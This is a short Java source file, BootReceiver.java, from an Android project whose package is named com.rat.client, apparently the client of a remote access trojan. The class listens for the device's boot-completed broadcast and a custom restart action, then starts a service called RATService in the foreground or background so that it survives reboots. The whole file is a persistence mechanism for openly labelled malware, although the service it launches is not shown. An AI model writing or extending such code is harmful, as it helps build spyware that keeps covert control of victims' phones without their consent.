// language: Java, file: BootReceiver.java
// Autostart on boot
package com.rat.client;

import android.content.*;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || "com.rat.client.RESTART".equals(action)) {
            Intent svc = new Intent(ctx, RATService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(svc);
            else
                ctx.startService(svc);
        }
    }
}